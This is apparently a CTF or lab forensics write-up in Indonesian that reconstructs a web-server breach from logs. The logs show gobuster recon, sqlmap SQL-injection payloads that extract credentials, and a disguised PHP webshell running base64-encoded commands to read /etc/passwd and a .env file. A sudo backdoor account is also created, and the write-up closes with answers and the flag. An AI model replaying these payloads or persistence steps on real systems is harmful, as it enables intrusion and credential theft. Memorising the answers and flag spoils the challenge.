# Perimeter Breach — Analisis

[← Overview](07-perimeter-breach.md) · [Index](index.md)

### 2.1 Reconnaissance — gobuster

```text
185.220.101.47 - - [10/Oct/2026:13:02:10 +0700] "GET /file3 HTTP/1.1" 404 196 "-" "gobuster/3.6"
185.220.101.47 - - [10/Oct/2026:13:02:10 +0700] "GET /index.php HTTP/1.1" 200 5312 "-" "gobuster/3.6"
185.220.101.47 - - [10/Oct/2026:13:02:10 +0700] "GET /.env HTTP/1.1" 403 153 "-" "gobuster/3.6"
185.220.101.47 - - [10/Oct/2026:13:02:10 +0700] "GET /.git HTTP/1.1" 403 153 "-" "gobuster/3.6"
185.220.101.47 - - [10/Oct/2026:13:02:12 +0700] "GET /admin/login.php HTTP/1.1" 200 1523 "-" "gobuster/3.6"
185.220.101.47 - - [10/Oct/2026:13:02:13 +0700] "GET /admin HTTP/1.1" 301 169 "-" "gobuster/3.6"
185.220.101.47 - - [10/Oct/2026:13:02:13 +0700] "GET /uploads HTTP/1.1" 301 169 "-" "gobuster/3.6"
185.220.101.47 - - [10/Oct/2026:13:02:15 +0700] "GET /robots.txt HTTP/1.1" 200 54 "-" "gobuster/3.6"
```

Temuan recon: `/admin`, `/admin/login.php`, `/uploads`, `/robots.txt`, `/.env` (403), `/.git` (403).

### 2.2 SQL injection — sqlmap

```text
185.220.101.47 - - [10/Oct/2026:13:15:31 +0700] "GET /products.php?id=1 HTTP/1.1" 200 4233 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
185.220.101.47 - - [10/Oct/2026:13:15:32 +0700] "GET /products.php?id=1%27 HTTP/1.1" 500 0 "-" "sqlmap/1.7.2#stable"
185.220.101.47 - - [10/Oct/2026:13:15:35 +0700] "GET /products.php?id=1%20AND%201%3D1 HTTP/1.1" 200 4121 "-" "sqlmap/1.7.2"
185.220.101.47 - - [10/Oct/2026:13:15:35 +0700] "GET /products.php?id=1%20AND%201%3D2 HTTP/1.1" 200 4722 "-" "sqlmap/1.7.2"
185.220.101.47 - - [10/Oct/2026:13:15:46 +0700] "GET /products.php?id=-1%27%20UNION%20SELECT%201%2C2%2C3%2C4%2C5--%20- HTTP/1.1" 200 5093 "-" "sqlmap/1.7.2"
185.220.101.47 - - [10/Oct/2026:13:15:48 +0700] "GET /products.php?id=-1%27%20UNION%20SELECT%201%2Ctable_name%2C3%2C4%2C5%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase%28%29--%20- HTTP/1.1" 200 4372 "-" "sqlmap/1.7.2"
185.220.101.47 - - [10/Oct/2026:13:15:50 +0700] "GET /products.php?id=-1%27%20UNION%20SELECT%201%2Cusername%2Cpassword%2C4%2C5%20FROM%20users--%20- HTTP/1.1" 200 4995 "-" "sqlmap/1.7.2"
185.220.101.47 - - [10/Oct/2026:13:15:51 +0700] "GET /products.php?id=1%20AND%20SLEEP%285%29 HTTP/1.1" 200 4841 "-" "sqlmap/1.7.2"
185.220.101.47 - - [10/Oct/2026:13:15:53 +0700] "GET /products.php?id=1%27%20AND%20ASCII%28SUBSTRING%28%28SELECT%20password%20FROM%20users%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E120--%20- HTTP/1.1" 200 5187 "-" "sqlmap/1.7.2"
```

Terlihat UNION-based SQLi, enumerasi `information_schema`, lalu ekstraksi `username,password FROM users`. Setelah itu penyerang melakukan brute-force login admin (60 request `POST /admin/login.php` dalam ~60 detik, 13:41:00–13:42:00).

### 2.3 Initial access — admin login

`webapp.log`:

```text
[2026-10-10 08:30:21] INFO  auth: login ok user=admin ip=36.80.14.22 pw_attempt="Aroma#Craft2026"
[2026-10-10 13:41:00] WARN  auth: login failed user=admin ip=185.220.101.47 pw_attempt="admin@123"
[2026-10-10 13:41:01] WARN  auth: login failed user=admin ip=185.220.101.47 pw_attempt="aromacraft2024"
...
[2026-10-10 13:42:02] INFO  auth: login ok user=admin ip=185.220.101.47 pw_attempt="Aroma#Craft2026"
[2026-10-10 13:42:55] INFO  upload: file saved name="cache_thumb.php" size=412 by=admin ip=185.220.101.47 mime="image/jpeg"
```

Login admin pertama pukul 08:30 dari `36.80.14.22` adalah admin sah. Penyerang berhasil login pukul **13:42:02** dengan password yang sama, `Aroma#Craft2026` — kemungkinan hasil dump SQLi atau password lemah yang tidak dirotasi.

Nginx mengonfirmasi:

```text
185.220.101.47 - - [10/Oct/2026:13:42:02 +0700] "POST /admin/login.php HTTP/1.1" 302 0 ... "python-requests/2.31.0"
185.220.101.47 - - [10/Oct/2026:13:42:06 +0700] "GET /admin/dashboard.php HTTP/1.1" 200 8841
185.220.101.47 - - [10/Oct/2026:13:42:17 +0700] "GET /admin/upload.php HTTP/1.1" 200 2104
```

### 2.4 Webshell execution

Upload:

```text
185.220.101.47 - - [10/Oct/2026:13:42:55 +0700] "POST /admin/upload.php HTTP/1.1" 200 312 "https://aromacraft.example/admin/upload.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
```

Webshell bernama `cache_thumb.php`, disamarkan sebagai gambar (`mime="image/jpeg"`), tetapi berisi kode PHP. Setelah itu penyerang memanggil:

```text
13:43:41 GET /uploads/cache_thumb.php?c=whoami                 200 258
13:43:56 GET /uploads/cache_thumb.php?c=id                     200 809
13:44:35 GET /uploads/cache_thumb.php?c=uname%20-a            200 80
13:44:49 GET /uploads/cache_thumb.php?c=pwd                    200 995
13:45:13 GET /uploads/cache_thumb.php?c=ls%20-la%20%2Fvar%2Fwww%2Fhtml 200 1313
13:45:37 GET /uploads/cache_thumb.php?c=echo%20Y2F0IC9ldGMvcGFzc3dk%7Cbase64%20-d%7Csh 200 1622
13:45:49 GET /uploads/cache_thumb.php?c=echo%20bHMgLWxhIC9ob21lL2RlcGxveQ%3D%3D%7Cbase64%20-d%7Csh 200 2400
13:46:06 GET /uploads/cache_thumb.php?c=echo%20Y2F0IC9ob21lL2RlcGxveS8uZW52%7Cbase64%20-d%7Csh 200 1037
13:46:31 GET /uploads/cache_thumb.php?c=echo%20Y3JvbnRhYiAtbA%3D%3D%7Cbase64%20-d%7Csh 200 36
13:47:02 GET /uploads/cache_thumb.php?c=ls%20-la%20%2Ftmp 200 176
```

Decode base64:

```text
Y2F0IC9ldGMvcGFzc3dk              -> cat /etc/passwd
bHMgLWxhIC9ob21lL2RlcGxveQ==      -> ls -la /home/deploy
Y2F0IC9ob21lL2RlcGxveS8uZW52      -> cat /home/deploy/.env
Y3JvbnRhYiAtbA==                  -> crontab -l
```

Ukuran respons `cat /home/deploy/.env` = 1037 byte, cukup besar untuk memuat kredensial. Ini menjadi jembatan ke lateral movement.

### 2.5 Lateral movement — SSH sebagai deploy

`auth.log`:

```text
Oct 10 14:20:03 web01 sshd[24410]: Accepted password for deploy from 185.220.101.47 port 45072 ssh2
Oct 10 14:20:03 web01 sshd[24410]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
```

Password `deploy` tidak terlihat di log, tetapi sangat mungkin berasal dari `/home/deploy/.env` yang dibaca webshell. Penyerang masuk via SSH password dari IP yang sama.

### 2.6 Persistence — user svc_backup

Masih di sesi `deploy`:

```text
Oct 10 14:20:17 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash -G sudo svc_backup
Oct 10 14:20:17 web01 useradd[24502]: new group: name=svc_backup, GID=1002
Oct 10 14:20:17 web01 useradd[24502]: new user: name=svc_backup, UID=1002, GID=1002, home=/home/svc_backup, shell=/bin/bash, from=/dev/pts/0
Oct 10 14:20:17 web01 usermod[24509]: add 'svc_backup' to group 'sudo'
Oct 10 14:20:34 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/chpasswd
Oct 10 14:20:34 web01 chpasswd[24520]: pam_unix(chpasswd:chauthtok): password changed for svc_backup
Oct 10 14:21:38 web01 sshd[24410]: Received disconnect from 185.220.101.47 port 45072:11: disconnected by user
Oct 10 14:41:27 web01 sshd[24688]: Accepted publickey for svc_backup from 185.220.101.47 port 52311 ssh2: RSA SHA256:Zk1pQ0v9
Oct 10 14:41:27 web01 sshd[24688]: pam_unix(sshd:session): session opened for user svc_backup(uid=1002) by (uid=0)
```

Persistence: akun `svc_backup` dengan sudo, password baru, dan **publickey** yang memungkinkan login ulang tanpa password. Fingerprint `SHA256:Zk1pQ0v9` adalah artifact kunci penyerang.

### 2.7 Lima pertanyaan investigasi (rekonstruksi)

Platform tidak menampilkan teks pertanyaan di artefak lokal. Jawaban berikut direkonstruksi dari urutan lima fase yang disebut deskripsi (recon, initial access, webshell, lateral movement, persistence). Tandai sebagai **[REKONSTRUKSI PERTANYAAN]**, sedangkan **jawaban** berasal dari log.

| # | Pertanyaan (rekonstruksi) | Jawaban dari log |
|---|---|---|
| 1 | Siapa IP penyerang? | `185.220.101.47` |
| 2 | Tool reconnaissance yang dipakai? | `gobuster/3.6` (dilanjutkan `sqlmap/1.7.2`) |
| 3 | Kredensial admin yang berhasil? | user `admin`, password `Aroma#Craft2026` (login 13:42:02) |
| 4 | Nama webshell yang di-upload? | `cache_thumb.php` di `/uploads/` (412 byte, MIME `image/jpeg`) |
| 5 | Akun persistence yang dibuat? | `svc_backup` (UID 1002, group `sudo`), login publickey 14:41:27 |

Flag `NFX{P4th_1nt0_Pr0duct10n}` konsisten dengan narasi “path into production” — dari recon sampai persistence di server produksi.
